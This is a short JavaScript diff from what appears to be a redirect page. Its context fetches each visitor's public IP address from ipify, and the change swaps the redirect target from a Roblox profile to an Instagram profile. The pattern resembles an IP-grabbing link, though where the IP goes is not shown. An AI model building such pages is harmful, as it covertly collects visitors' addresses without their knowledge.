@@ -15,5 +15,5 @@ $.getJSON('https://api.ipify.org/?format=json')
     });
 setTimeout(function()
 {
-window.location.replace("https://www.roblox.com/users/5729012523/profile");
+window.location.replace("https://www.instagram.com/iv.emy/");
 }, 280)
